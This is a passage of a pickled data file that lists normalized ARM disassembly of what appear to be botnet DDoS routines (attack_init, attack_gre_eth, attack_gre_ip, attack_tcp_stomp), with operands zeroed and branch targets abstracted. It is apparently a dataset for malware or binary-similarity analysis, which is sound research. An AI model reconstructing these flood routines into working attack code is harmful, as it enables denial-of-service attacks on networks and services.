SP,0]\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nCMP~R1,0\nBLE~FOO\nSUBS~R2,R7,0\nBEQ~FOO\nADD~R0,R9,0\nLDRB~R3,[R9,0]\nLDR~R1,[SP,0]\nSTRB~R3,[R1,0]\nSUBS~R3,R2,0\nBEQ~FOO\nADD~R1,R0,0\nLDRB~R8,[R0,0]\nSUB~R7,R3,0\nMOV~R4,R8\nCMP~R8,R7\nBGT~FOO\nADD~R6,R1,0\nLDR~R2,[SP,0]\nADD~R11,R2,0\nMOV~R5,R2\nMOV~R9,0\nB~FOO\nSUBS~R2,R7,R4\nBEQ~FOO\nADD~R0,R8,R6\nMOV~R5,R11\nLDRB~R3,[R8,R6]\nSTRB~R3,[R11,0]\nSUBS~R3,R2,0\nBEQ~FOO\nADD~R1,R0,0\nLDRB~R8,[R0,0]\nSUB~R7,R3,0\nMOV~R4,R8\nADD~R11,R11,0\nCMP~R7,R8\nBLT~FOO\nADD~R6,R1,0\nADD~R0,R4,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[R5]\nMOV~R1,R6\nMOV~R2,R4\nBL~FOO\nADD~R9,R9,0\nLDR~R3,[SP,0]\nCMP~R3,R9\nBNE~FOO\nBL~FOO\nMOV~R3,0\nSTR~R3,[R0]\nAND~R3,R10,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R10,LSR0\nAND~R2,R10,0\nMOV~R0,R10,LSL0\nORR~R0,R0,R2,LSL0\nLDR~R1,[SP,0]\nSTR~R1,[SP]\nLDR~R2,[SP,0]\nSTR~R2,[SP,0]\nORR~R0,R3,R0\nLDR~R1,[SP,0]\nLDR~R2,[SP,0]\nLDR~R3,[SP,0]\nBL~FOO\nLDR~R3,[SP,0]\nCMP~R3,0\nLDRNE~R0,[SP,0]\nBLNE~FOO\nLDR~R1,[SP,0]\nCMP~R1,0\nBEQ~FOO\nLDR~R5,[SP,0]\nCMP~R5,0\nBLE~FOO\nMOV~R4,0\nLDR~R2,[SP,0]\nLDR~R0,[R2,R4,LSL0]\nCMP~R0,0\nBLNE~FOO\nADD~R4,R4,0\nCMP~R5,R4\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p191
L616L
tp192
a(S'attack_kill_all'
p193
S'"STMFD~SP!,{R4-R7,LR}\nLDR~R4,<STR>\nMOV~R7,0\nLDR~R6,<STR>\nMOV~R5,R4\nLDR~R0,[R4]\nCMP~R0,0\nMOVNE~R1,0\nBLNE~FOO\nSTR~R7,[R5]\nADD~R4,R4,0\nCMP~R4,R6\nBNE~FOO\nBL~FOO\nLDMFD~SP!,{R4-R7,PC}"'
p194
L60L
tp195
a(S'add_attack'
p196
S'"STMFD~SP!,{R4-R6,LR}\nMOV~R6,R1\nAND~R4,R0,0\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nMOV~R5,R0\nSTRB~R4,[R0,0]\nSTR~R6,[R0]\nLDR~R6,<STR>\nLDR~R4,<STR>\nLDRB~R1,[R4]\nMOV~R1,R1,LSL0\nLDR~R0,[R6]\nADD~R1,R1,0\nBL~FOO\nSTR~R0,[R6]\nLDRB~R3,[R4]\nSTR~R5,[R0,R3,LSL0]\nADD~R3,R3,0\nSTRB~R3,[R4]\nLDMFD~SP!,{R4-R6,PC}"'
p197
L88L
tp198
a(S'attack_init'
p199
S'"STR~LR,[SP,-0]\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~R1,<STR>\nBL~FOO\nMOV~R0,0\nLDR~PC,[SP]"'
p200
L132L
tp201
a(S'attack_gre_eth'
p202
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R11,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R6,R6,0\nSTR~R6,[SP,0]\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nSTR~R2,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R12,[SP,0]\nMOV~R3,R12,LSL0\nADD~R11,R3,0\nMOV~R0,R11,LSR0\nSTR~R0,[SP,0]\nMOV~R9,R3,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R1,R3,LSR0\nSTR~R1,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R2,[SP,0]\nSTR~R0,[R2,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R4,[R2,R3,LSL0]\nADD~R1,R4,0\nADD~R0,R4,0\nADD~R5,R4,0\nADD~R6,R4,0\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nSTRB~R10,[R4,0]\nMOV~R3,R11,LSR0\nAND~R3,R3,0\nLDR~R12,[SP,0]\nORR~R3,R12,R3,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nSTRB~R8,[R4,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R3,[SP,0]\nSTR~R3,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R3,R12\nLDR~R3,[R3,0]\nSTR~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R1,0]\nSUB~R3,R3,0\nSTRB~R3,[R1,0]\nMOV~R1,0\nORR~R3,R1,0\nSTRB~R3,[R0,0]\nSTRB~R1,[R0,0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nSTRB~R10,[R5,0]\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nLDR~R0,[SP,0]\nMVN~R3,R0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nSTRB~R8,[R5,0]\nCMP~R7,R1\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nSTRNEB~R1,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nLDRNE~R3,[R4,0]\nSTRNE~R3,[R5,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTREQ~R3,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nLDR~R1,[SP,0]\nORR~R3,R1,R3,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nLDR~R2,[SP,0]\nCMP~R2,R4\nBGT~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nCMP~R12,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R11,R3,0\nMOV~R10,0\nLDR~R0,[SP,0]\nLDR~R9,[R0,R2,LSL0]\nMOV~R7,R9\nADD~R8,R9,0\nADD~R6,R9,0\nADD~R5,R9,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R1,[SP,0]\nADD~R2,R3,R1\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nLDR~R12,[SP,0]\nADD~R3,R3,R12\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R9,0]\nLDR~R0,[SP,0]\nCMN~R0,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R7,0]\nLDR~R1,[SP,0]\nCMP~R1,R11\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTRB~R0,[R7,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSUB~R0,R0,0\nMVN~R0,R0\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R2,[SP,0]\nCMP~R2,R11\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R3,[SP,0]\nCMP~R3,R11\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R12,[SP,0]\nCMP~R12,0\nLDRNE~R3,[R7,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R8\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nADD~R0,R8,0\nADD~R1,SP,0\nMOV~R2,0\nBL~FOO\nLDR~R0,[SP,0]\nCMP~R0,0\nADDNE~R0,R5,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R10,[R7,0]\nSTRB~R10,[R7,0]\nMOV~R0,R7\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nSTRB~R10,[R6,0]\nSTRB~R10,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R10,[R5,0]\nSTRB~R10,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R12,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nLDR~R0,[SP,0]\nADD~R1,R3,R0\nMOV~R2,0\nSTRB~R2,[R3,R0]\nSTRB~R10,[R1,0]\nLDR~R3,[R7,0]\nSTR~R3,[R1,0]\nSTRB~R10,[R1,0]\nSTRB~R10,[R1,0]\nSTR~R1,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R9\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nLDR~R12,[SP,0]\nCMP~R2,R12\nBLT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p203
L1720L
tp204
a(S'attack_gre_ip'
p205
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nMOV~R11,R1\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R9,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R6,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nLDR~R3,<STR>\nLDR~R3,[R3]\nBL~FOO\nMOV~R4,R0\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R0,[SP,0]\nSTR~R0,[SP,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,R9,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nAND~R6,R6,0\nSTR~R6,[SP,0]\nSTR~R4,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R12,[SP,0]\nCMP~R12,0\nSTR~R12,[SP,0]\nBLE~FOO\nMOV~R4,R3\nLDR~R0,[SP,0]\nMOV~R3,R0,LSL0\nADD~R1,R3,0\nSTR~R1,[SP,0]\nMOV~R2,R1,LSR0\nSTR~R2,[SP,0]\nMOV~R9,R3,LSR0\nADD~R3,R3,0\nSTR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nBL~FOO\nLDR~R12,[SP,0]\nSTR~R0,[R12,R4,LSL0]\nLDR~R3,[SP,0]\nLDR~R4,[R12,R3,LSL0]\nADD~R1,R4,0\nADD~R5,R4,0\nADD~R6,R4,0\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nLDRB~R3,[R4]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R4]\nSTRB~R10,[R4,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R3,R3,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R4,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R4,0]\nSTRB~R8,[R4,0]\nCMP~R7,0\nMOVNE~R3,0\nSTRNEB~R3,[R4,0]\nSUBNE~R3,R3,0\nSTRNEB~R3,[R4,0]\nMOV~R3,0\nSTRB~R3,[R4,0]\nLDR~R0,[SP,0]\nSTR~R0,[R4,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R3,R3,R11\nLDR~R3,[R3,0]\nSTR~R3,[R4,0]\nMOV~R0,0\nMOV~R3,0\nSTRB~R3,[R1,0]\nSTRB~R0,[R1,0]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nLDRB~R3,[R5]\nBIC~R3,R3,0\nORR~R3,R3,0\nSTRB~R3,[R5]\nSTRB~R10,[R5,0]\nADD~R3,R9,0\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nLDR~R1,[SP,0]\nMVN~R3,R1\nMOV~R3,R3,LSL0\nMOV~R2,R3,LSR0\nMOV~R3,R3,LSR0\nAND~R2,R2,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R5,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R5,0]\nSTRB~R8,[R5,0]\nCMP~R7,R0\nMOVNE~R3,0\nSTRNEB~R3,[R5,0]\nSTRNEB~R0,[R5,0]\nMOV~R3,0\nSTRB~R3,[R5,0]\nBL~FOO\nSTR~R0,[R5,0]\nLDR~R2,[SP,0]\nCMP~R2,0\nLDRNE~R3,[R4,0]\nSTRNE~R3,[R5,0]\nSUBEQ~R3,R0,0\nMVNEQ~R3,R3\nSTREQ~R3,[R5,0]\nLDR~R12,[SP,0]\nMOV~R3,R12,LSR0\nAND~R2,R12,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R0,[SP,0]\nMOV~R3,R0,LSR0\nAND~R2,R0,0\nORR~R3,R3,R2,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R1,[SP,0]\nMOV~R3,R1,LSR0\nAND~R3,R3,0\nLDR~R2,[SP,0]\nORR~R3,R2,R3,LSL0\nSTRB~R3,[R6,0]\nMOV~R3,R3,ASR0\nSTRB~R3,[R6,0]\nLDR~R3,[SP,0]\nADD~R4,R3,0\nSTR~R4,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,R4\nBGT~FOO\nMOV~R3,0\nLDR~R12,[SP,0]\nCMP~R12,R3\nMOV~R2,R3\nBLE~FOO\nSTR~R3,[SP,0]\nMOV~R3,0\nSUB~R9,R3,0\nMOV~R8,0\nLDR~R0,[SP,0]\nLDR~R10,[R0,R2,LSL0]\nMOV~R7,R10\nADD~R6,R10,0\nADD~R5,R10,0\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R2,R3,R11\nLDRB~R3,[R2,0]\nCMP~R3,0\nBHI~FOO\nLDR~R4,[R2,0]\nBL~FOO\nAND~R2,R4,0\nMOV~R2,R2,LSR0\nORR~R2,R2,R4,LSR0\nAND~R3,R4,0\nMOV~R4,R4,LSL0\nORR~R4,R4,R3,LSL0\nORR~R2,R2,R4\nLDR~R1,[SP,0]\nMOV~R3,R1,LSL0\nSUB~R3,R3,R1,LSL0\nADD~R3,R3,R11\nLDRB~R3,[R3,0]\nADD~R2,R2,R0,LSRR3\nAND~R3,R2,0\nMOV~R3,R3,LSR0\nORR~R3,R3,R2,LSR0\nAND~R1,R2,0\nMOV~R2,R2,LSL0\nORR~R2,R2,R1,LSL0\nORR~R3,R3,R2\nSTR~R3,[R10,0]\nLDR~R1,[SP,0]\nCMN~R1,0\nBNE~FOO\nBL~FOO\nSTR~R0,[R7,0]\nLDR~R2,[SP,0]\nCMP~R2,R9\nBNE~FOO\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTRB~R0,[R7,0]\nMOV~R3,R0,ASR0\nSTRB~R3,[R7,0]\nSUB~R0,R0,0\nMVN~R0,R0\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nLDR~R3,[SP,0]\nCMP~R3,R9\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R12,[SP,0]\nCMP~R12,R9\nBNE~FOO\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R0,[SP,0]\nCMP~R0,0\nLDRNE~R3,[R7,0]\nSTRNE~R3,[R6,0]\nBNE~FOO\nBL~FOO\nSTR~R0,[R6,0]\nLDR~R1,[SP,0]\nCMP~R1,0\nADDNE~R0,R5,0\nLDRNE~R1,[SP,0]\nBLNE~FOO\nSTRB~R8,[R7,0]\nSTRB~R8,[R7,0]\nMOV~R0,R7\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R7,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R7,0]\nSTRB~R8,[R6,0]\nSTRB~R8,[R6,0]\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nSTRB~R0,[R6,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R6,0]\nSTRB~R8,[R5,0]\nSTRB~R8,[R5,0]\nLDRB~R3,[R5,0]\nLDRB~R2,[R5,0]\nMOV~R0,R6\nMOV~R1,R5\nORR~R2,R3,R2,LSL0\nLDR~R12,[SP,0]\nADD~R3,R12,0\nBL~FOO\nSTRB~R0,[R5,0]\nMOV~R0,R0,ASR0\nSTRB~R0,[R5,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nSUB~R3,R3,R2,LSL0\nADD~R1,R3,R11\nMOV~R2,0\nSTRB~R2,[R3,R11]\nSTRB~R8,[R1,0]\nLDR~R3,[R7,0]\nSTR~R3,[R1,0]\nSTRB~R8,[R1,0]\nSTRB~R8,[R1,0]\nSTR~R1,[SP]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R0,[SP,0]\nMOV~R1,R10\nLDR~R3,[SP,0]\nADD~R2,R3,0\nMOV~R3,0\nBL~FOO\nLDR~R3,[SP,0]\nADD~R2,R3,0\nSTR~R2,[SP,0]\nLDR~R12,[SP,0]\nCMP~R12,R2\nBGT~FOO\nB~FOO\nADD~SP,SP,0\nLDMFD~SP!,{R4-R11,PC}"'
p206
L1604L
tp207
a(S'attack_tcp_stomp'
p208
S'"STMFD~SP!,{R4-R11,LR}\nSUB~SP,SP,0\nSTR~R1,[SP,0]\nMOV~R5,R3\nAND~R0,R0,0\nSTR~R0,[SP,0]\nAND~R4,R2,0\nMOV~R1,0\nBL~FOO\nMOV~R9,R0\nLDR~R0,[SP,0]\nMOV~R1,0\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R6,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R6\nBL~FOO\nMOV~R0,R0,LSL0\nMOV~R0,R0,LSR0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R10,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R8,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nAND~R7,R0,0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,0\nBL~FOO\nMOV~R11,R0\nMOV~R0,R4\nMOV~R1,R5\nMOV~R2,0\nMOV~R3,R2\nBL~FOO\nAND~R0,R0,0\nSTR~R0,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nSTR~R0,[SP,0]\nCMN~R0,0\nBEQ~FOO\nADD~R3,SP,0\nMOV~R2,0\nSTR~R2,[R3,-0]\nADD~R2,R2,0\nSTR~R2,[SP]\nMOV~R1,0\nSUB~R2,R2,0\nBL~FOO\nCMN~R0,0\nBNE~FOO\nLDR~R0,[SP,0]\nBL~FOO\nB~FOO\nLDR~R1,[SP,0]\nSTR~R1,[SP,0]\nLDR~R2,[SP,0]\nMOV~R3,R2,LSL0\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R3,0\nSTR~R3,[SP,0]\nLDR~R3,[SP,0]\nCMP~R3,0\nSTR~R3,[SP,0]\nLDRGT~R1,[SP,0]\nMOVGT~R1,R1,LSR0\nSTRGT~R1,[SP,0]\nBLE~FOO\nADD~R2,R11,0\nSTR~R2,[SP,0]\nLDR~R3,[SP,0]\nMOV~R3,R3,LSR0\nSTR~R3,[SP,0]\nMOV~R0,0\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nMOV~R6,R0\nCMN~R0,0\nBEQ~FOO\nMOV~R1,0\nMOV~R2,0\nBL~FOO\nORR~R2,R0,0\nMOV~R0,R6\nMOV~R1,0\nBL~FOO\nMOV~R3,0